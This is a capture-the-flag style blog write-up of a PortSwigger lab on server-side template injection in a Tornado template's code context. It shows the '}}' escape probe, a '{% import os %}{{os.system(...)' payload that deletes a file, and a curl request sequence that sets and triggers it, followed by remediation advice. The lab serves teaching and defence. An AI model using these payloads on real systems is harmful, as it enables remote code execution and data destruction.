---
layout: post
title: "PortSwigger: Basic server-side template injection (code context)"
date: 2027-11-06 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, SSTI]
tags: [portswigger, ssti, template-injection, tornado, python, rce, cwe-1336, cwe-94]
---

A blog lets you choose how your name shows up next to your comments — "Name", "First Name", or "Nickname". That choice is stored and then dropped straight into a **Tornado** (Python) template *expression* before the page is rendered. Because your input is already sitting inside the template's `{{ }}` braces, you can break out of the expression and run arbitrary Python. This is **server-side template injection** in a *code context* ([CWE-1336](https://cwe.mitre.org/data/definitions/1336.html) / [CWE-94](https://cwe.mitre.org/data/definitions/94.html)), and it leads to remote code execution.

## Overview

The goal is to delete `/home/carlos/morale.txt` on the server, which means we need OS command execution.

A *template* is an HTML skeleton with placeholders the app fills with data. Tornado uses `{{ expr }}` to print an expression and `{% statement %}` to run a Python statement. The "preferred name" feature does not store your *choice* — it stores the literal text `user.name` and then renders:

```
{{ user.name }}
```

Since whatever you submit lands **inside** those braces, you are writing template code, not data.

## Why `{{7*7}}` doesn't work here

In a normal SSTI you'd submit `{{7*7}}` and see `49`. Here the value is already wrapped in `{{ }}`, so `{{7*7}}` becomes `{{ {{7*7}} }}` — broken. You first have to **close the expression you're in** with `}}`, then open a new one:

```
user.name}}{{7*7}}
```

After setting this and viewing a post you've commented on, the comment author renders as:

```
Peter Wiener49}}
```

`}}` closed the original expression, `{{7*7}}` evaluated to `49`, and the template's leftover `}}` printed literally. That confirms the code context.

## Exploitation

Tornado runs arbitrary Python in `{% ... %}` blocks, so we import `os` and call `os.system`:

```
user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
```

The server builds this full template:

```
{{user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}
```

- `}}` closes the original expression
- `{% import os %}` runs a Python statement
- `{{os.system('...')` starts a new expression that runs the command
- the template's own trailing `}}` closes it

### Working requests

```bash
U="https://<lab-id>.web-security-academy.net"

# 1. log in as wiener:peter (scrape csrf from /login first)
curl -sk -b cookies.txt -c cookies.txt "$U/login" \
  --data-urlencode "csrf=<csrf>" --data-urlencode "username=wiener" --data-urlencode "password=peter"

# 2. post a comment so the author-display field actually renders on a post
curl -sk -b cookies.txt "$U/post/comment" \
  --data-urlencode "csrf=<csrf>" --data-urlencode "postId=4" \
  --data-urlencode "comment=Nice" --data-urlencode "name=wiener" \
  --data-urlencode "email=w@test.com" --data-urlencode "website=http://x"

# 3. set the malicious "preferred name" template
curl -sk -b cookies.txt "$U/my-account/change-blog-post-author-display" \
  --data-urlencode "csrf=<csrf>" \
  --data-urlencode "blog-post-author-display=user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')"

# 4. view the post to trigger the render → command executes
curl -sk "$U/post?postId=4" -o /dev/null
```

The lab flips to **Solved** the instant the template renders and the file is deleted.

## Why it worked

The app trusted user input as part of the template *code*. In a code context the input is already inside an expression, so a printed `{{7*7}}` probe is meaningless — the real test (and the real exploit) is to **escape the expression first** with `}}`, then inject. Tornado offers no sandbox by default, so once you can write a `{% import os %}` statement you have full Python and full RCE as the rendering process.

## The fix

- Never render user-controlled strings as templates. Pass them only as **bound context data** to a fixed, pre-written template.
- Map the user's display choice to a value on the server with a switch/lookup — never store and re-render the raw expression.
- Use a sandboxed template environment that forbids `import`, attribute access, and builtins.
- Render templates under a low-privilege account so a successful injection can't reach other users' files.
